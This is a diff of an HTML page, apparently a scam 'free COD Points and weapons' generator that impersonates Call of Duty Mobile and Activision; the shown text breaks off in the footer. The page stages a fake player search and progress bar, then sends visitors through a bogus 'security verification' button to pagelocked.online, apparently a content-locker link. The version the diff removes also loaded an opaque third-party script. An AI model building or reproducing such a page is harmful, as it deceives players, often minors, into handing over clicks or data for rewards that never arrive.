@@ -1,276 +1,865 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" id="html-root" dir="ltr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CALL OF DUTY</title>
-  
- <!-- FAVICON -->
-    <link rel="icon" href="https://i.ibb.co/TDr9YzDW/20260308-182040.jpg" type="image/webp">
-
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
-
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
-</head>
-
+  <title>bigomod rewards</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Oswald:wght@400;700&display=swap" rel="stylesheet">
+  <!-- FAVICON -->
+    <link rel="icon" href="https://i.ibb.co/FLpdNDfW/call-of-duty-mobile-logos-05-removebg-preview.png" type="image/webp">
+      <meta name="description" content="rewards in call of duty 2026">
+  <meta name="keywords" content="bigomod ; codmu">
+  <meta property="og:title" content="bigomod -  ITEMS 2026">
+  <meta property="og:description" content="bigomod -  ITEMS CODM 2026">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
   <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-
-    body{
-      font-family: "Segoe UI", Tahoma, Arial, sans-serif;
-      background-image:url('https://i.postimg.cc/MGMBk4HF/391133.jpg');
-      background-repeat:no-repeat;
-      background-position:center;
-      background-size:cover;
-      min-height:100vh;
-      padding:15px;
-      color:#fff;
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Oswald', 'Cairo', sans-serif;
+      user-select: none;
     }
 
-    .container{max-width:1200px;margin:0 auto;position:relative;z-index:10}
-
-    .logo{text-align:center;margin-bottom:30px;padding-top:20px}
-    .logo-image{max-width:320px;margin:0 auto;display:block;filter:drop-shadow(0 6px 20px rgba(0,0,0,.7))}
-
-    .input-section{text-align:center;margin-bottom:25px}
-
-    .id-input{
-      width:100%;
-      max-width:360px;
-      height:48px;
-      padding:0 15px;
-      font-size:18px;
-      font-weight:bold;
-      border-radius:10px;
-      border:2px solid rgba(255,255,255,.2);
-      background:rgba(0,0,0,.75);
-      color:#fff;
-      margin-bottom:15px;
-      outline:none;
+    body {
+      background-color: #0c0f12;
+      /* خلفية عسكرية داكنة مع لمسات إضاءة */
+      background-image: 
+        radial-gradient(circle, rgba(16, 21, 28, 0.9) 0%, rgba(5, 7, 10, 0.95) 100%),
+        url('https://wallpapercave.com/wp/wp5446312.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
     }
 
-    .generate-btn{
-      background:linear-gradient(#c7a400,#7a6200);
-      color:#000;
-      border:2px solid #e5c700;
-      padding:16px 42px;
-      font-size:22px;
-      font-weight:900;
-      border-radius:10px;
-      cursor:pointer;
-      box-shadow:0 6px 15px rgba(0,0,0,.5);
+    /* شريط اللغات العلوي */
+    .header-bar {
+      display: flex;
+      justify-content: flex-end;
+      padding: 15px 20px;
+      width: 100%;
     }
 
-    .selection-text{
-      text-align:center;
-      font-size:22px;
-      margin-bottom:20px;
-      text-shadow:0 3px 10px #000;
+    [dir="rtl"] .header-bar {
+      justify-content: flex-start;
     }
 
-    .gamepasses-grid{
-      display:grid;
-      grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
-      gap:14px;
+    .lang-selector-box {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 188, 3, 0.3);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 0.9rem;
+      cursor: pointer;
     }
 
-    .gamepass-item{
-      background:rgba(0,0,0,.8);
-      border-radius:14px;
-      padding:14px;
-      cursor:pointer;
-      border:2px solid transparent;
-      text-align:center;
-      transition:.2s;
+    .lang-select {
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-weight: bold;
+      outline: none;
+      cursor: pointer;
+    }
+    .lang-select option {
+      background: #0f1319;
+      color: #fff;
     }
 
-    .gamepass-item:hover{transform:scale(1.03);border-color:#e5c700}
-    .gamepass-item.selected{border-color:#e5c700;box-shadow:0 0 15px #e5c700}
-
-    .gamepass-icon img{width:100%;max-height:120px;object-fit:contain}
-
-    .gamepass-name{margin-top:10px;font-size:16px;font-weight:900;color:#e5c700}
-
-    .modal{
-      display:none;
-      position:fixed;
-      inset:0;
-      background:rgba(0,0,0,.7);
-      z-index:999;
-      align-items:center;
-      justify-content:center;
-    }
-    .modal.show{display:flex}
-
-    .modal-content{
-      background:#111;
-      border-radius:12px;
-      padding:30px;
-      text-align:center;
-      max-width:350px;
-      width:100%;
-      color:#fff;
-      border:2px solid #e5c700;
+    .container {
+      width: 100%;
+      max-width: 540px;
+      margin: 0 auto;
+      padding: 10px 20px 40px 20px;
+      text-align: center;
     }
 
-    .loading-spinner{
-      width:48px;height:48px;border:4px solid #e5c700;border-top:4px solid transparent;border-radius:50%;
-      animation:spin 1s linear infinite;margin:0 auto 20px;
+    /* الشعار العلوي */
+    .logo-container {
+      margin-bottom: 25px;
     }
-    @keyframes spin{to{transform:rotate(360deg)}}
-
-    .verify-btn{
-      background:#e5c700;
-      color:#000;
-      border:none;
-      padding:12px 26px;
-      font-size:18px;
-      font-weight:900;
-      border-radius:8px;
-      cursor:pointer;
+    .top-logo-img {
+      max-width: 260px;
+      height: auto;
+      filter: drop-shadow(0px 6px 8px rgba(0,0,0,0.6));
     }
 
-    .lang-box{
-      position:fixed;top:10px;right:10px;z-index:50;
+    /* لوحة التحكم الرئيسية */
+    .card-panel {
+      background: rgba(15, 20, 28, 0.9);
+      border: 3px solid #232a35;
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+      margin-bottom: 25px;
+      min-height: 150px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
     }
-    .lang-box select{
-      padding:6px 10px;border-radius:6px;font-weight:bold;
+
+    .section-label {
+      display: block;
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: #ffd103;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+    }
+
+    .input-box {
+      width: 100%;
+      background: #151a22;
+      border: 2px solid #323d4e;
+      border-radius: 10px;
+      padding: 14px;
+      font-size: 1.15rem;
+      font-weight: bold;
+      color: #ffffff;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .input-box:focus {
+      border-color: #ffd103;
+    }
+
+    /* زر تكتيكي بلون أصفر مائل للبرتقالي (CODM Style) */
+    .btn-action-yellow {
+      width: 100%;
+      background: linear-gradient(to bottom, #ffd103 0%, #b38600 100%);
+      border: 2px solid #1a1a1a;
+      border-bottom: 6px solid #735600;
+      border-radius: 10px;
+      padding: 12px 20px;
+      cursor: pointer;
+      box-shadow: 0 6px 0 rgba(0,0,0,0.4);
+      transition: all 0.1s ease;
+      margin-top: 15px;
+    }
+    .btn-action-yellow:active {
+      transform: translateY(4px);
+      border-bottom: 2px solid #735600;
+      box-shadow: 0 2px 0 rgba(0,0,0,0.4);
+    }
+
+    .btn-text-style {
+      color: #0a0d10;
+      font-weight: 900;
+      font-size: 1.35rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .fade-wrapper {
+      animation: fadeIn 0.4s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(5px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* شريط التقدم */
+    .progress-container {
+      display: none;
+      margin-top: 15px;
+    }
+    .progress-bar-bg {
+      width: 100%;
+      background: #090c0f;
+      border-radius: 10px;
+      padding: 4px;
+      border: 2px solid #232b35;
+      margin-bottom: 8px;
+    }
+    .progress-bar-fill {
+      width: 0%;
+      height: 16px;
+      background: linear-gradient(to right, #ffd103, #ff8c00);
+      border-radius: 6px;
+      transition: width 0.1s linear;
+    }
+    .progress-text {
+      font-size: 0.9rem;
+      color: #a0aab5;
+      font-weight: bold;
+    }
+
+    /* قسم الهدايا والجوائز */
+    .rewards-section {
+      opacity: 0.35;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+    }
+    .rewards-section.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .rewards-group {
+      background: rgba(15, 20, 28, 0.9);
+      border: 3px solid #232a35;
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      margin-bottom: 25px;
+    }
+
+    /* شبكة الخيارات الـ 4 لنقاط الـ CP */
+    .cp-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-top: 15px;
+    }
+
+    /* شبكة الخيارات الـ 12 للأسلحة */
+    .weapons-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    /* تصميم بطاقات المكافآت التكتيكية */
+    .reward-card {
+      background: linear-gradient(135deg, #161c24 0%, #0d1117 100%);
+      border: 2px solid #2d3746;
+      border-radius: 12px;
+      padding: 15px 10px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .reward-card:hover {
+      transform: translateY(-4px);
+      border-color: #ffd103;
+      box-shadow: 0 5px 15px rgba(255, 209, 3, 0.15);
+    }
+    .reward-card.selected {
+      border-color: #ffd103;
+      background: linear-gradient(135deg, #222b37 0%, #111720 100%);
+      box-shadow: 0 0 15px rgba(255, 209, 3, 0.3);
+    }
+    .reward-card.selected::before {
+      content: '✓';
+      position: absolute;
+      top: 5px;
+      right: 5px;
+      background: #ffd103;
+      color: #0c0f12;
+      font-weight: 900;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.8rem;
+      z-index: 5;
+    }
+
+    /* شارات (جديد / NEW) على الأسلحة */
+    .badge-new {
+      position: absolute;
+      top: 0;
+      right: 0;
+      background: #e74c3c;
+      color: #ffffff;
+      font-size: 0.65rem;
+      font-weight: 900;
+      padding: 3px 8px;
+      border-bottom-left-radius: 8px;
+      text-transform: uppercase;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+      z-index: 2;
+    }
+
+    .reward-icon-img {
+      width: 100%;
+      max-height: 85px;
+      object-fit: contain;
+      margin-bottom: 8px;
+      filter: drop-shadow(0px 4px 6px rgba(0,0,0,0.5));
+    }
+    
+    .reward-amount {
+      font-size: 1.25rem;
+      font-weight: 900;
+      color: #ffd103;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+    }
+    .reward-label {
+      font-size: 0.8rem;
+      color: #a0aab5;
+      text-transform: uppercase;
+    }
+
+    /* تظليل نصوص الأسلحة */
+    .weapon-label {
+      font-size: 0.75rem;
+      font-weight: bold;
+      color: #ffffff;
+      margin-top: auto;
+      text-align: center;
+      word-break: break-word;
+    }
+
+    /* النافذة التكتيكية المنبثقة (Modal) */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-box {
+      background: #11161d;
+      border: 3px solid #ffd103;
+      border-radius: 16px;
+      padding: 30px 20px;
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
+      animation: slideDown 0.3s ease-out;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    .modal-close {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 24px;
+      cursor: pointer;
+      color: #a0aab5;
+    }
+    .modal-close:hover {
+      color: #fff;
+    }
+    .modal-title {
+      font-size: 1.6rem;
+      color: #ffd103;
+      margin-bottom: 15px;
+      text-transform: uppercase;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+    }
+    .modal-text {
+      font-size: 0.95rem;
+      color: #ffffff;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+    
+    .btn-modal-link {
+      display: inline-block;
+      text-decoration: none;
+      background: linear-gradient(to bottom, #ffd103 0%, #b38600 100%);
+      border: 2px solid #1a1a1a;
+      border-bottom: 6px solid #735600;
+      border-radius: 10px;
+      padding: 12px 28px;
+      cursor: pointer;
+      box-shadow: 0 4px 0 rgba(0,0,0,0.4);
+      transition: all 0.1s ease;
+    }
+    .btn-modal-link:active {
+      transform: translateY(2px);
+      border-bottom: 2px solid #735600;
+    }
+
+    /* التذييل المظلم */
+    footer {
+      background: #05070a;
+      padding: 30px 15px;
+      text-align: center;
+      width: 100%;
+      border-top: 2px solid #10151d;
+      margin-top: auto;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-bottom: 25px;
+    }
+
+    .footer-links a {
+      color: #a0aab5;
+      text-decoration: none;
+      font-size: 0.85rem;
+      font-weight: bold;
+      transition: color 0.2s;
+    }
+    .footer-links a:hover {
+      color: #ffd103;
+    }
+
+    .footer-logo-img {
+      max-width: 130px;
+      height: auto;
+      opacity: 0.65;
+      margin: 0 auto 15px auto;
+      display: block;
+      transition: opacity 0.2s;
+    }
+    .footer-logo-img:hover {
+      opacity: 1;
+    }
+
+    .manage-cookies {
+      font-size: 0.8rem;
+      color: #555e68;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 25px;
+    }
+
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .social-icons a {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+    }
+    .social-icons svg {
+      fill: #a0aab5;
+      width: 100%;
+      height: 100%;
     }
   </style>
-
-  <script type="text/javascript">
-    var wBqwA_QjX_WOurUc={"it":4356614,"key":"8f823"};
-  </script>
-  <script src="https://da4talg8ap14y.cloudfront.net/50d0131.js"></script>
 </head>
-
 <body>
 
-<div class="lang-box">
-  <select onchange="setLang(this.value)">
-    <option value="en">🇺🇸 EN</option>
-    <option value="jp">🇯🇵 JP</option>
-    <option value="es">🇪🇸 ES</option>
-    <option value="pt">🇵🇹 PT</option>
-  </select>
-</div>
-
-<div class="container">
-
-  <div class="logo">
-    <img src="https://i.postimg.cc/JzspzRhD/R-8270372134c1283982dfee3dbd610967-rik-g-A-v-Ok-DH5O-d-TA-riu-http-www-warpzoned-com-wp-co.jpg" class="logo-image">
-  </div>
-
-  <div class="input-section">
-    <input id="user-id" class="id-input" placeholder="Enter your Player ID">
-    <button class="generate-btn" id="continueBtn" onclick="generateGamepass()">CONTINUE</button>
-  </div>
-
-  <div class="selection-text" id="selectText">Select your COD Points:</div>
-
-  <div class="gamepasses-grid">
-    <div class="gamepass-item" onclick="toggleSelection(this)" data-id="cp1">
-      <div class="gamepass-icon"><img src="https://i.postimg.cc/FR5T2wQs/OIP.webp"></div>
-      <div class="gamepass-name">1,100 CP</div>
-    </div>
-
-    <div class="gamepass-item" onclick="toggleSelection(this)" data-id="cp2">
-      <div class="gamepass-icon"><img src="https://i.postimg.cc/FR5T2wQs/OIP.webp"></div>
-      <div class="gamepass-name">2,400 CP</div>
-    </div>
-
-    <div class="gamepass-item" onclick="toggleSelection(this)" data-id="cp3">
-      <div class="gamepass-icon"><img src="https://i.postimg.cc/FR5T2wQs/OIP.webp"></div>
-      <div class="gamepass-name">3,000 CP</div>
-    </div>
-
-    <div class="gamepass-item" onclick="toggleSelection(this)" data-id="cp4">
-      <div class="gamepass-icon"><img src="https://i.postimg.cc/FR5T2wQs/OIP.webp"></div>
-      <div class="gamepass-name">10,000 CP</div>
+  <!-- شريط اللغات العلوي -->
+  <div class="header-bar">
+    <div class="lang-selector-box">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ffd103" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="2" y1="12" x2="22" y2="12"></line>
+        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+      </svg>
+      <select class="lang-select" onchange="changeLanguage(this.value)">
+        <option value="en">English</option>
+        <option value="ar">العربية</option>
+        <option value="fr">Français</option>
+      </select>
     </div>
   </div>
-</div>
 
-<div id="loadingModal" class="modal">
-  <div class="modal-content">
-    <div class="loading-spinner"></div>
-    <h2 id="loadingText">Searching player...</h2>
+  <div class="container">
+    
+    <!-- الشعار العلوي لـ Call of Duty: Mobile -->
+    <div class="logo-container">
+      <img src="https://www.pngarts.com/files/8/Call-of-Duty-Mobile-Logo-PNG-Image.png" alt="Call of Duty Mobile Logo" class="top-logo-img">
+    </div>
+
+    <!-- لوحة التحكم التناوبية الرئيسية -->
+    <div class="card-panel" id="main-panel">
+      
+      <!-- الخطوة الأولى: إدخال الآيدي والبحث -->
+      <div id="id-input-wrapper" class="fade-wrapper">
+        <label class="section-label" id="label-id" for="player-id">Enter Player ID</label>
+        <input type="text" class="input-box" id="player-id" placeholder="e.g. 681234567891234567" dir="ltr">
+        
+        <button class="btn-action-yellow" id="btn-continue" onclick="startSearch()">
+          <span class="btn-text-style" id="btn-text-continue">Continue</span>
+        </button>
+
+        <!-- شريط التحميل -->
+        <div class="progress-container" id="search-progress">
+          <div class="progress-bar-bg">
+            <div class="progress-bar-fill" id="progress-fill"></div>
+          </div>
+          <div class="progress-text" id="progress-status">Searching for player...</div>
+        </div>
+      </div>
+
+      <!-- الخطوة الثانية: التحقق الأمني (مخفي افتراضياً ويظهر بعد الاختيار) -->
+      <div id="verification-wrapper" class="fade-wrapper" style="display: none;">
+        <div class="section-label" id="label-verify">Security Verification Required</div>
+        <button class="btn-action-yellow" onclick="openModal()">
+          <span class="btn-text-style" id="btn-text-verify">Verify & Confirm</span>
+        </button>
+      </div>
+
+    </div>
+
+    <!-- حاوية الجوائز والمكافآت -->
+    <div class="rewards-section" id="rewards-panel">
+      
+      <!-- أولاً: اختيار نقاط COD (CP) -->
+      <div class="rewards-group">
+        <div class="section-label" id="label-choose-points">Select your points COD :</div>
+        <div class="cp-grid">
+          <!-- 1100 CP -->
+          <div class="reward-card cp-card" onclick="selectCP(this, '1,100 CP')">
+            <img class="reward-icon-img" src="https://cdn.topuplive.com/cdn-cgi/image/format=webp/uploads/images/goods/20250213/1739438720_rxVMXoKkXb.png" alt="CP">
+            <div class="reward-amount">1,100</div>
+            <div class="reward-label">COD Points</div>
+          </div>
+          <!-- 2400 CP -->
+          <div class="reward-card cp-card" onclick="selectCP(this, '2,400 CP')">
+            <img class="reward-icon-img" src="https://cdn.topuplive.com/cdn-cgi/image/format=webp/uploads/images/goods/20250213/1739438805_jHBxRvMsY6.png" alt="CP">
+            <div class="reward-amount">2,400</div>
+            <div class="reward-label">COD Points</div>
+          </div>
+          <!-- 3000 CP -->
+          <div class="reward-card cp-card" onclick="selectCP(this, '3,000 CP')">
+            <img class="reward-icon-img" src="https://cdn.topuplive.com/cdn-cgi/image/format=webp/uploads/images/goods/20250213/1739438859_wddY6KKTsa.webp" alt="CP">
+            <div class="reward-amount">3,000</div>
+            <div class="reward-label">COD Points</div>
+          </div>
+          <!-- 10000 CP -->
+          <div class="reward-card cp-card" onclick="selectCP(this, '10,000 CP')">
+            <img class="reward-icon-img" src="https://cdn.topuplive.com/cdn-cgi/image/format=webp/uploads/images/goods/20250213/1739438903_3sGJeALzHp.png" alt="CP">
+            <div class="reward-amount">10,000</div>
+            <div class="reward-label">COD Points</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ثانياً: اختيار السلاح الأسطوري -->
+      <div class="rewards-group">
+        <div class="section-label" id="label-choose-weapons">Select your weapons :</div>
+        <div class="weapons-grid">
+          <!-- AK117 -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'AK117')">
+            <img class="reward-icon-img" src="https://i.ibb.co/QZxsYJH/20260426-151818.png" alt="AK117">
+            <div class="weapon-label">AK117</div>
+          </div>
+          <!-- Kilo 141 -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'Kilo 141')">
+            <img class="reward-icon-img" src="https://i.ibb.co/nsM5GKsq/20260426-151726.png" alt="Kilo 141">
+            <div class="weapon-label">Kilo 141</div>
+          </div>
+          <!-- Type 19 -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'Type 19')">
+            <img class="reward-icon-img" src="https://i.ibb.co/N6HnpbD4/20260426-151634.png" alt="Type 19">
+            <div class="weapon-label">Type 19</div>
+          </div>
+          <!-- USS 9 -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'USS 9')">
+            <img class="reward-icon-img" src="https://i.ibb.co/Z1LHwZS2/20260412-170258.png" alt="USS 9">
+            <div class="weapon-label">USS 9</div>
+          </div>
+          <!-- CX-9 -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'CX-9')">
+            <img class="reward-icon-img" src="https://i.postimg.cc/jqXLmPZQ/photo-5962868616946453872-x-removebg-preview.png" alt="CX-9">
+            <div class="weapon-label">CX-9</div>
+          </div>
+          <!-- LW3 -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'LW3')">
+            <img class="reward-icon-img" src="https://i.ibb.co/mCDyL2Cn/20260412-170040.png" alt="LW3">
+            <div class="weapon-label">LW3</div>
+          </div>
+          <!-- PP19 Bizon -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'PP19 Bizon')">
+            <img class="reward-icon-img" src="https://i.ibb.co/GhQV37z/20260416-013642.png" alt="PP19 Bizon">
+            <div class="weapon-label">PP19 Bizon</div>
+          </div>
+          <!-- KRM-262 -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'KRM-262')">
+            <img class="reward-icon-img" src="https://i.ibb.co/rKQrMsd9/20260416-013615.png" alt="KRM-262">
+            <div class="weapon-label">KRM-262</div>
+          </div>
+          <!-- Grau 5.56 (NEW!) -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'Grau 5.56')">
+            <span class="badge-new tag-new">NEW!</span>
+            <img class="reward-icon-img" src="https://i.ibb.co/bjmZKgBB/20260804-151840.png" alt="Grau 5.56">
+            <div class="weapon-label">Grau 5.56</div>
+          </div>
+          <!-- M13 Morningstar (NEW!) -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'M13')">
+            <span class="badge-new tag-new">NEW!</span>
+            <img class="reward-icon-img" src="https://i.ibb.co/ycqZhCxP/20260804-152158.png" alt="M13">
+            <div class="weapon-label">M13 Morningstar</div>
+          </div>
+          <!-- USS9 - Soten Ranka (NEW!) -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'USS9 Soten')">
+            <span class="badge-new tag-new">NEW!</span>
+            <img class="reward-icon-img" src="https://i.ibb.co/R447ctfb/20260804-152505.png" alt="USS9 Soten">
+            <div class="weapon-label">USS9 - Soten Ranka</div>
+          </div>
+          <!-- Fennec - Ascended (NEW!) -->
+          <div class="reward-card weapon-card" onclick="selectWeapon(this, 'Fennec')">
+            <span class="badge-new tag-new">NEW!</span>
+            <img class="reward-icon-img" src="https://i.ibb.co/xS67SpxY/20260804-152655.png" alt="Fennec">
+            <div class="weapon-label">Fennec - Ascended</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
   </div>
-</div>
 
-<div id="verificationModal" class="modal">
-  <div class="modal-content">
-    <h2 id="verifyTitle">Almost Ready</h2>
-    <p id="verifyDesc">Verify to receive your COD Points.</p>
-    <button class="verify-btn" id="verifyBtn" onclick="location.href='https://pagelocked.online/cl/i/5nn78w';">VERIFY</button>
+  <!-- النافذة التكتيكية المنبثقة (Modal Overlay) -->
+  <div class="modal-overlay" id="custom-modal">
+    <div class="modal-box">
+      <span class="modal-close" onclick="closeModal()">&times;</span>
+      <div class="modal-title" id="modal-title">Verification Required</div>
+      <div class="modal-text" id="modal-text">To securely transfer the rewards you have selected, please confirm that you are a real player by clicking the button below.</div>
+      
+      <!-- الرابط التفاعلي المؤدي لصفحة العروض والتحقق -->
+      <a href="https://pagelocked.online/cl/i/ex24mq" target="_blank" class="btn-modal-link" id="btn-modal-link">
+        <span class="btn-text-style" id="btn-text-modal" style="color: #0c0f12;">Accept & Proceed</span>
+      </a>
+    </div>
   </div>
-</div>
 
-<script>
-let selectedItems=new Set();
+  <!-- التذييل -->
+  <footer>
+    <div class="footer-links">
+      <a href="#" id="link-parent">Parent's Guide</a>
+      <a href="#" id="link-terms">Terms of Use</a>
+      <a href="#" id="link-privacy">Privacy Policy</a>
+    </div>
 
-const translations={
-  en:{placeholder:"Enter your Player ID",continue:"CONTINUE",select:"Select your COD Points:",searching:"Searching player...",found:"Player found",generating:"Generating CP...",verifyTitle:"Almost Ready",verifyDesc:"Verify to receive your COD Points.",verifyBtn:"VERIFY"},
-  jp:{placeholder:"プレイヤーIDを入力",continue:"続行",select:"CODポイントを選択:",searching:"プレイヤーを検索中...",found:"プレイヤーが見つかりました",generating:"CPを生成中...",verifyTitle:"もう少しです",verifyDesc:"CODポイントを受け取るには確認してください。",verifyBtn:"確認"},
-  es:{placeholder:"Ingresa tu ID de jugador",continue:"CONTINUAR",select:"Selecciona tus COD Points:",searching:"Buscando jugador...",found:"Jugador encontrado",generating:"Generando CP...",verifyTitle:"Casi listo",verifyDesc:"Verifica para recibir tus COD Points.",verifyBtn:"VERIFICAR"},
-  pt:{placeholder:"Digite seu ID de jogador",continue:"CONTINUAR",select:"Selecione seus COD Points:",searching:"Procurando jogador...",found:"Jogador encontrado",generating:"Gerando CP...",verifyTitle:"Quase pronto",verifyDesc:"Verifique para receber seus COD Points.",verifyBtn:"VERIFICAR"}
-};
+    <!-- شعار مطور اللعبة في الأسفل -->
+    <img src="https://www.nicepng.com/png/full/43-439805_activision-logo-white.png" alt="Activision Logo" class="footer-logo-img">
 
-function setLang(lang){
-  const t=translations[lang];
-  document.getElementById('user-id').placeholder=t.placeholder;
-  document.getElementById('continueBtn').textContent=t.continue;
-  document.getElementById('selectText').textContent=t.select;
-  document.getElementById('verifyTitle').textContent=t.verifyTitle;
-  document.getElementById('verifyDesc').textContent=t.verifyDesc;
-  document.getElementById('verifyBtn').textContent=t.verifyBtn;
-  window.currentLang=lang;
-}
+    <a href="#" class="manage-cookies" id="link-cookies">Manage Cookies</a>
 
-function toggleSelection(el){
-  const id=el.dataset.id;
-  if(selectedItems.has(id)){
-    selectedItems.delete(id);
-    el.classList.remove('selected');
-  }else{
-    selectedItems.clear();
-    document.querySelectorAll('.gamepass-item').forEach(i=>i.classList.remove('selected'));
-    selectedItems.add(id);
-    el.classList.add('selected');
-  }
-}
+    <!-- أيقونات التواصل الاجتماعي -->
+    <div class="social-icons">
+      <a href="#">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/></svg>
+      </a>
+      <a href="#">
+        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+      </a>
+      <a href="#">
+        <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.051.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>
+      </a>
+      <a href="#">
